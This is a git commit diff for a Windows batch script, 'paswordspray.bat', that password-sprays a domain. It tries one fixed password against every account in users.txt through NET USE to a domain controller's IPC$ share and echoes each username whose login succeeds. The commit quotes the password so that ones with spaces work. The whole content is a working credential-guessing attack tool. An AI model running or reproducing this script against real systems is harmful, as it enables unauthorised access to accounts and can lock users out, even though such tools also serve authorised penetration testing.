231ac5b33da4111250fdf5e7c308425aa05c8e59
Mark Eldridge <8285554+meldridge@users.noreply.github.com>
2018-06-05 15:32:07 +0200

    Fixed for passwords containing spaces

--- paswordspray.bat
+++ paswordspray.bat
@@ -5,6 +5,6 @@ SET "DC=DC.DOMAIN.COM"
 SET "PASS=Summer2018"
 
 FOR /F %%U IN (users.txt) DO (
-  NET USE \\%DC%\IPC$ /USER:DOMAIN\%%U %PASS% 1>NUL 2>&1 && echo [*] %%U:%PASS% success && @NET USE /DELETE \\%DC%\IPC$ >NUL
+  NET USE \\%DC%\IPC$ /USER:DOMAIN\%%U "%PASS%" 1>NUL 2>&1 && echo [*] %%U:"%PASS%" success && @NET USE /DELETE \\%DC%\IPC$ >NUL
 )
 
